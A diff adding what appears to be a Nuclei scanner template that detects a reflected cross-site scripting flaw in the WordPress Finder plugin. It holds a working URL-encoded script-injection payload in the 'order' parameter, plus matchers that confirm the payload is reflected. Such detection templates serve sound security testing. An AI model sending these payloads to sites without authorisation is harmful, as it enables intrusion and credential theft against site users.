@@ -1,0 +1,51 @@
+id: wp-finder-xss
+
+info:
+  name: WordPress Finder - Cross-Site Scripting
+  author: daffainfo
+  severity: high
+  description: WordPress Plugin Finder contains a cross-site scripting vulnerability via the order parameter. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+  reference:
+    - https://packetstormsecurity.com/files/115902/WordPress-Finder-Cross-Site-Scripting.html
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  metadata:
+    max-request: 2
+  tags: xss,wp-plugin,packetstorm,wordpress
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        internal: true
+        words:
+          - '/wp-content/plugins/finder/'
+
+  - method: GET
+    path:
+      - '{{BaseURL}}/wp-content/plugins/finder/index.php?by=type&dir=tv&order=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "</script><script>alert(document.domain)</script>"
+        part: body
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a00473045022100fd0f2d22823ed01f2d02a2e998d19a2e7cc02f27d21fa1f9e5633d30af4a536502207f5ac9e1431029932eb557f58d1ed0c7d4e18ca1555c4ac747938cf7f426a10f:922c64590222798bb761d5b6d8e72950
